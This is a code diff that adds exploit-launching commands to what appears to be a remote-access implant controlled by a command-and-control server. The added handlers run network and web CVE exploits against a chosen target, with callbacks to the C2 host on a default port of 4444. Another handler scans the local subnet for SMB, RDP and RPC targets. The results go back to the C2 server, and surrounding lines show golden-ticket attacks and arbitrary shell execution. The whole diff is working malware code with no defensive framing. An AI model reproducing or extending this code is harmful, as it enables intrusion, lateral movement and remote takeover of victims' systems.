@@ -2147,6 +2147,63 @@ $filter='(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=41
                        "Then: export KRB5CCNAME=<user>.ccache; python3 psexec.py -k <domain>/<user>@<dc>")
                 _post(f"/agent/result?id={AID}&cmd=GOLDEN_TICKET", out)
 
+            # ── Network CVE exploits ─────────────────────────────────────────
+            elif cmd and cmd.startswith("NET_EXPLOIT "):
+                # NET_EXPLOIT <cve> <target_ip> [lhost] [lport]
+                parts = cmd.split()
+                cve_name  = parts[1] if len(parts) > 1 else ""
+                target_ip = parts[2] if len(parts) > 2 else ""
+                lhost     = parts[3] if len(parts) > 3 else C2_URL.split("//")[-1].split(":")[0]
+                lport     = int(parts[4]) if len(parts) > 4 else 4444
+                if not cve_name or not target_ip:
+                    out = "Usage: NET_EXPLOIT <cve> <target_ip> [lhost] [lport]"
+                else:
+                    try:
+                        _exploit_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "exploit")
+                        if _exploit_dir not in sys.path: sys.path.insert(0, _exploit_dir)
+                        import network_cve as _ncve
+                        out = str(_ncve.run(cve_name, target_ip=target_ip, lhost=lhost, lport=lport))
+                    except ImportError:
+                        out = f"network_cve module not found. C2 direct: /exploit/net/{cve_name}?target={target_ip}&lhost={lhost}&lport={lport}"
+                    except Exception as e:
+                        out = f"Error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=NET_EXPLOIT", out[:3000])
+
+            elif cmd and cmd.startswith("WEB_EXPLOIT "):
+                # WEB_EXPLOIT <cve> <target_url> [lhost] [lport]
+                parts = cmd.split(None, 4)
+                cve_name   = parts[1] if len(parts) > 1 else ""
+                target_url = parts[2] if len(parts) > 2 else ""
+                lhost      = parts[3] if len(parts) > 3 else C2_URL.split("//")[-1].split(":")[0]
+                lport      = int(parts[4]) if len(parts) > 4 else 4444
+                if not cve_name or not target_url:
+                    out = "Usage: WEB_EXPLOIT <cve> <target_url> [lhost] [lport]"
+                else:
+                    try:
+                        _exploit_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "exploit")
+                        if _exploit_dir not in sys.path: sys.path.insert(0, _exploit_dir)
+                        import web_cve as _wcve
+                        out = str(_wcve.run(cve_name, target_url=target_url, lhost=lhost, lport=lport))
+                    except ImportError:
+                        out = f"web_cve module not found. C2 direct: /exploit/web/{cve_name}?target={target_url}&lhost={lhost}&lport={lport}"
+                    except Exception as e:
+                        out = f"Error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=WEB_EXPLOIT", out[:3000])
+
+            elif cmd == "EXPLOIT_SCAN":
+                # Scan local /24 for CVE targets (SMB/RDP/RPC)
+                try:
+                    _exploit_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "exploit")
+                    if _exploit_dir not in sys.path: sys.path.insert(0, _exploit_dir)
+                    import network_cve as _ncve, socket as _sock
+                    local_ip = _sock.gethostbyname(_sock.gethostname())
+                    subnet   = ".".join(local_ip.split(".")[:3]) + ".0"
+                    summary, _ = _ncve.scan_for_targets(subnet)
+                    out = f"CVE Scan — {subnet}/24\n" + ("\n".join(summary) if summary else "No targets found")
+                except Exception as e:
+                    out = f"Scan error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=EXPLOIT_SCAN", out)
+
             elif cmd and cmd!="PING":
                 _post(f"/agent/result?id={AID}&cmd="+_parse.quote(cmd[:80]),_shell(cmd))
         except: pass
